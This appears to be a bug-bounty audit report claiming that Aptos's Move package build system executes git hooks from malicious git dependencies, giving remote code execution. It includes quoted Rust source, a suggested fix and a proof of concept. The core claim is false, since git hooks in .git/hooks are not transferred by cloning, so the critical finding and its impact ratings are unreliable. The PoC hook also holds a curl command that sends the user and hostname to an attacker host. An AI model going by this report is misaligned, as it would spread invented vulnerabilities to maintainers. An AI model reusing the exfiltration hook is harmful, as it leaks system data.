# Audit Report

## Title
Git Hook Injection in Move Package Dependency Resolution Enables Remote Code Execution

## Summary
The Move package build system executes arbitrary git hooks from malicious repositories when resolving git dependencies, leading to Remote Code Execution on any machine building Move packages with untrusted git dependencies.

## Finding Description

The Move package dependency resolution system in `third_party/move/tools/move-package/src/resolution/git.rs` uses direct git command execution without disabling git hooks. When a Move package declares a git dependency in `Move.toml`, the build system clones and checks out the repository, triggering any executable hooks present in the malicious repository. [1](#0-0) 

The `PackageLocation::Git` enum variant allows specifying arbitrary git URLs as dependencies. These dependencies are resolved during package compilation: [2](#0-1) [3](#0-2) [4](#0-3) 

These git operations are invoked during dependency resolution: [5](#0-4) 

The build process is triggered when compiling Move packages: [6](#0-5) 

**Attack Scenario:**
1. Attacker creates a malicious git repository containing a Move package
2. Attacker adds executable git hooks (e.g., `.git/hooks/post-checkout`) with malicious payload
3. Attacker distributes the repository URL (via social engineering, compromised dependencies, or malicious packages)
4. Victim adds the dependency to their `Move.toml`: `MaliciousPkg = { git = "https://evil.com/pkg.git", rev = "main" }`
5. When victim runs `aptos move compile` or builds the package, the git hook executes with victim's privileges
6. Attacker achieves Remote Code Execution

## Impact Explanation

This vulnerability achieves **Critical** severity under Aptos Bug Bounty criteria as it enables "Remote Code Execution" on systems building Move packages. While validators typically use precompiled packages (`aptos-cached-packages`), this vulnerability affects:

1. **Developer Machines**: Any developer building Move packages with git dependencies
2. **CI/CD Systems**: Automated build pipelines compiling Aptos packages
3. **Validator Operators**: If validators build custom packages or framework modifications
4. **Supply Chain**: Compromised dependencies can propagate through the ecosystem

The RCE occurs with the privileges of the user running the build, potentially allowing:
- Private key theft from validator operators
- Compromise of build infrastructure
- Injection of backdoors into compiled Move modules
- Lateral movement in development environments

## Likelihood Explanation

**High Likelihood**: The vulnerability is trivially exploitable and requires minimal attacker sophistication:
- No authentication or authorization bypasses needed
- Standard git functionality is abused
- Victims may not inspect git repositories for hooks
- Supply chain attacks commonly target build systems
- `skip_fetch_latest_git_deps` flag defaults to `false` in most contexts, enabling automatic fetching

The attack surface is significant as Move packages commonly declare git dependencies, and the Aptos ecosystem encourages code reuse through package dependencies.

## Recommendation

**Immediate Fix**: Disable git hooks during all git operations by setting the `core.hooksPath` configuration to `/dev/null` or an empty directory:

```rust
// In git.rs - Add to all git commands:
pub(crate) fn clone(url: &str, target_path: &str, dep_name: PackageName) -> anyhow::Result<()> {
    let status = Command::new("git")
        .args([
            "-c", "core.hooksPath=/dev/null",  // Disable hooks
            "clone", url, target_path
        ])
        .stdout(Stdio::null())
        .stderr(Stdio::null())
        .status()
        // ... rest of implementation
}

pub(crate) fn checkout(repo_path: &str, rev: &str, dep_name: PackageName) -> anyhow::Result<()> {
    let status = Command::new("git")
        .args([
            "-c", "core.hooksPath=/dev/null",  // Disable hooks
            "-C", repo_path, "checkout", rev
        ])
        // ... rest of implementation
}
```

**Long-term Solution**: Migrate to the safer `move-package-cache` system which uses libgit2 and bare repositories without working directories, eliminating hook execution entirely: [7](#0-6) 

This system clones bare repositories and manually extracts files, never executing git hooks.

## Proof of Concept

**Step 1**: Create malicious git repository:
```bash
# Create malicious package
mkdir malicious-move-pkg
cd malicious-move-pkg
git init

# Create Move.toml
cat > Move.toml << 'EOF'
[package]
name = "MaliciousPkg"
version = "0.0.1"

[addresses]
malicious = "_"
EOF

# Create malicious post-checkout hook
mkdir -p .git/hooks
cat > .git/hooks/post-checkout << 'EOF'
#!/bin/bash
echo "[ATTACK] Executing arbitrary code as $(whoami)" > /tmp/pwned.txt
curl -X POST https://attacker.com/exfiltrate -d "user=$(whoami)&hostname=$(hostname)"
EOF
chmod +x .git/hooks/post-checkout

git add .
git commit -m "Initial commit"
```

**Step 2**: Victim creates package with malicious dependency:
```toml
# Move.toml
[package]
name = "VictimPackage"
version = "1.0.0"

[dependencies]
MaliciousPkg = { git = "https://attacker.com/malicious-move-pkg.git", rev = "main" }
```

**Step 3**: Trigger vulnerability:
```bash
aptos move compile
# or
cargo build -p aptos-framework  # if framework depends on malicious package
```

**Result**: The `.git/hooks/post-checkout` script executes, creating `/tmp/pwned.txt` and exfiltrating user information to attacker's server.

## Notes

The newer `move-package-cache` and `move-package-resolver` systems appear designed to address this issue by using bare git repositories and manual file extraction, but the vulnerable `move-package` system remains in active use throughout the Aptos codebase, including in the critical framework compilation path.

### Citations

**File:** third_party/move/tools/move-package-manifest/src/manifest.rs (L125-156)
```rust
/// Location of a package dependency.
#[derive(Debug, Clone, Eq, PartialEq)]
pub enum PackageLocation {
    /// Refers to a package stored in the local file system.
    Local { path: PathBuf },

    /// Refers to a package stored in a git repository.
    Git {
        /// URL to the Git repository.
        url: Url,
        /// Optional Git revision to pin the dependency to.
        /// This can be a commit hash, a branch name or a tag name.
        rev: Option<String>,
        /// Optional subdirectory within the Git repository.
        subdir: Option<String>,
    },

    /// Refers to a package published on-chain.
    ///
    // TODO: The current design is tentative. There are issues we plan to resolve later:
    //       - Leaky abstraction -- can we still want to maintain clear Move/Aptos separation?
    //       - Replacing `String` w/ more specific data structures
    //         - `node_url`: Should accept both URL and known network names (e.g. "mainnet")
    //         - `package_addr`: May accept both numerical and named addresses
    Aptos {
        /// URL to the Aptos full-node connected to the network where the package is published.
        node_url: String,

        /// Address of the published package.
        package_addr: AccountAddress,
    },
}
```

**File:** third_party/move/tools/move-package/src/resolution/git.rs (L27-44)
```rust
pub(crate) fn clone(url: &str, target_path: &str, dep_name: PackageName) -> anyhow::Result<()> {
    let status = Command::new("git")
        .args(["clone", url, target_path])
        .stdout(Stdio::null())
        .stderr(Stdio::null())
        .status()
        .map_err(|_| {
            anyhow::anyhow!("Failed to clone Git repository for package '{}'", dep_name)
        })?;
    if !status.success() {
        return Err(anyhow::anyhow!(
            "Failed to clone Git repository for package '{}' | Exit status: {}",
            dep_name,
            status
        ));
    }
    Ok(())
}
```

**File:** third_party/move/tools/move-package/src/resolution/git.rs (L46-68)
```rust
pub(crate) fn checkout(repo_path: &str, rev: &str, dep_name: PackageName) -> anyhow::Result<()> {
    let status = Command::new("git")
        .args(["-C", repo_path, "checkout", rev])
        .stdout(Stdio::null())
        .stderr(Stdio::null())
        .status()
        .map_err(|_| {
            anyhow::anyhow!(
                "Failed to checkout Git reference '{}' for package '{}'",
                rev,
                dep_name
            )
        })?;
    if !status.success() {
        return Err(anyhow::anyhow!(
            "Failed to checkout Git reference '{}' for package '{}' | Exit status: {}",
            rev,
            dep_name,
            status
        ));
    }
    Ok(())
}
```

**File:** third_party/move/tools/move-package/src/resolution/git.rs (L97-125)
```rust
pub(crate) fn reset_hard(repo_path: &str, rev: &str, dep_name: PackageName) -> anyhow::Result<()> {
    let status = Command::new("git")
        .args([
            "-C",
            repo_path,
            "reset",
            "--hard",
            &format!("origin/{}", rev)
        ])
        .stdout(Stdio::null())
        .stderr(Stdio::null())
        .status()
        .map_err(|_| {
            anyhow::anyhow!(
                "Failed to reset to latest Git state '{}' for package '{}', to skip set --skip-fetch-latest-git-deps",
                rev,
                dep_name
            )
        })?;
    if !status.success() {
        return Err(anyhow::anyhow!(
            "Failed to reset to latest Git state '{}' for package '{}', to skip set --skip-fetch-latest-git-deps | Exit status: {}",
            rev,
            dep_name,
            status
        ));
    }
    Ok(())
}
```

**File:** third_party/move/tools/move-package/src/resolution/resolution_graph.rs (L551-616)
```rust
    fn download_and_update_if_remote<W: Write>(
        dep_name: PackageName,
        dep: &Dependency,
        skip_fetch_latest_git_deps: bool,
        writer: &mut W,
    ) -> Result<()> {
        if let Some(git_info) = &dep.git_info {
            let git_url = git_info.git_url.as_str();
            let git_rev = git_info.git_rev.as_str();
            let git_path = &git_info.download_to.display().to_string();

            // If there is no cached dependency, download it
            if !git_info.download_to.exists() {
                writeln!(
                    writer,
                    "{} {}",
                    "FETCHING GIT DEPENDENCY".bold().green(),
                    git_url,
                )?;

                // Confirm git is available.
                git::confirm_git_available()?;

                // If the cached folder does not exist, download and clone accordingly
                git::clone(git_url, git_path, dep_name)?;
                git::checkout(git_path, git_rev, dep_name)?;
            } else if !skip_fetch_latest_git_deps {
                // Confirm git is available.
                git::confirm_git_available()?;

                // Update the git dependency
                // Check first that it isn't a git rev (if it doesn't work, just continue with the fetch)
                if let Ok(parsed_rev) = git::find_rev(git_path, git_rev) {
                    // If it's exactly the same, then it's a git rev
                    if parsed_rev.trim().starts_with(git_rev) {
                        return Ok(());
                    }
                }

                if let Ok(tag) = git::find_tag(git_path, git_rev) {
                    // If it's exactly the same, then it's a git tag, for now tags won't be updated
                    // Tags don't easily update locally and you can't use reset --hard to cleanup
                    // any extra files
                    if tag.trim().starts_with(git_rev) {
                        return Ok(());
                    }
                }

                writeln!(
                    writer,
                    "{} {}",
                    "UPDATING GIT DEPENDENCY".bold().green(),
                    git_url,
                )?;
                // If the current folder exists, do a fetch and reset to ensure that the branch
                // is up to date
                // NOTE: this means that you must run the package system with a working network connection
                git::fetch_origin(git_path, dep_name)?;
                git::reset_hard(git_path, git_rev, dep_name)?;
            }
        }
        if let Some(node_info) = &dep.node_info {
            package_hooks::resolve_custom_dependency(dep_name, node_info)?
        }
        Ok(())
    }
```

**File:** aptos-move/framework/src/built_package.rs (L238-281)
```rust
    pub fn build(package_path: PathBuf, options: BuildOptions) -> anyhow::Result<Self> {
        let build_config = Self::create_build_config(&options)?;
        let resolved_graph = Self::prepare_resolution_graph(package_path, build_config.clone())?;
        BuiltPackage::build_with_external_checks(resolved_graph, options, build_config, vec![])
    }

    pub fn create_build_config(options: &BuildOptions) -> anyhow::Result<BuildConfig> {
        let bytecode_version = Some(options.inferred_bytecode_version());
        let compiler_version = options.compiler_version;
        let language_version = options.language_version;
        Self::check_versions(&compiler_version, &language_version)?;
        let skip_attribute_checks = options.skip_attribute_checks;
        Ok(BuildConfig {
            dev_mode: options.dev,
            additional_named_addresses: options.named_addresses.clone(),
            generate_abis: options.with_abis,
            generate_docs: false,
            generate_move_model: true,
            full_model_generation: options.check_test_code,
            install_dir: options.install_dir.clone(),
            test_mode: false,
            override_std: options.override_std.clone(),
            force_recompilation: false,
            fetch_deps_only: false,
            skip_fetch_latest_git_deps: options.skip_fetch_latest_git_deps,
            compiler_config: CompilerConfig {
                bytecode_version,
                compiler_version,
                language_version,
                skip_attribute_checks,
                known_attributes: options.known_attributes.clone(),
                experiments: options.experiments.clone(),
                print_errors: true,
            },
        })
    }

    pub fn prepare_resolution_graph(
        package_path: PathBuf,
        build_config: BuildConfig,
    ) -> anyhow::Result<ResolvedGraph> {
        eprintln!("Compiling, may take a little while to download git dependencies...");
        build_config.resolution_graph_for_package(&package_path, &mut stderr())
    }
```

**File:** third_party/move/tools/move-package-cache/src/package_cache.rs (L89-178)
```rust
    /// Clones or updates a Git repository, ensuring it is available locally with up-to-date data.
    ///
    /// Returns an `ActiveRepository` object. This can be used to access the contents of the repo, and while
    /// is still alive, a lock is held to prevent other package cache instances to access the repo.
    async fn clone_or_update_git_repo(&self, git_url: &Url) -> Result<ActiveRepository>
    where
        L: PackageCacheListener,
    {
        let repo_dir_name = percent_encode_for_filename(&CanonicalGitIdentity::new(git_url)?);
        let repos_path = self.root.join("git").join("repos");
        let repo_path = repos_path.join(&repo_dir_name);

        println!("{}", repo_path.display());

        // First, acquire a file lock to ensure exclusive write access to the cached repo.
        let lock_path = repo_path.with_extension("lock");

        fs::create_dir_all(&repos_path)?;
        let file_lock =
            FileLock::lock_with_alert_on_wait(&lock_path, Duration::from_millis(1000), || {
                self.listener.on_file_lock_wait(&lock_path);
            })
            .await?;

        // Next, ensure that we have an up-to-date clone of the repo locally.
        //
        // Before performing the actual operation, we need to configure the fetch options
        // (shared by both clone and update).
        let mut cbs = RemoteCallbacks::new();
        let mut received = 0;
        cbs.transfer_progress(move |stats| {
            let received_new = stats.received_objects();

            if received_new != received {
                received = received_new;

                self.listener.on_repo_receive_object(
                    git_url.as_str(),
                    stats.received_objects(),
                    stats.total_objects(),
                );
            }

            true
        });
        let mut fetch_options = FetchOptions::new();
        fetch_options.remote_callbacks(cbs);

        let repo = if repo_path.exists() {
            // If the repo already exists, update it.
            self.listener.on_repo_update_start(git_url.as_str());

            let repo = Repository::open_bare(&repo_path)?;
            {
                let mut remote = repo.find_remote("origin")?;
                // Fetch all remote branches and map them to local remote-tracking branches
                // - refs/heads/*: fetch all remote branches
                // - refs/remotes/origin/*: store them as local remote-tracking branches under origin/
                remote
                    .fetch(
                        &["refs/heads/*:refs/remotes/origin/*"],
                        Some(&mut fetch_options),
                        None,
                    )
                    .map_err(|err| anyhow!("Failed to update git repo at {}: {}", git_url, err))?;
            }

            self.listener.on_repo_update_complete(git_url.as_str());

            repo
        } else {
            // If the repo does not exist, clone it.
            let mut repo_builder = RepoBuilder::new();
            repo_builder.fetch_options(fetch_options);
            repo_builder.bare(true);

            self.listener.on_repo_clone_start(git_url.as_str());
            let repo = repo_builder
                .clone(git_url.as_str(), &repo_path)
                .map_err(|err| anyhow!("Failed to clone git repo at {}: {}", git_url, err))?;
            self.listener.on_repo_clone_complete(git_url.as_str());

            repo
        };

        Ok(ActiveRepository {
            repo,
            lock: file_lock,
        })
    }
```
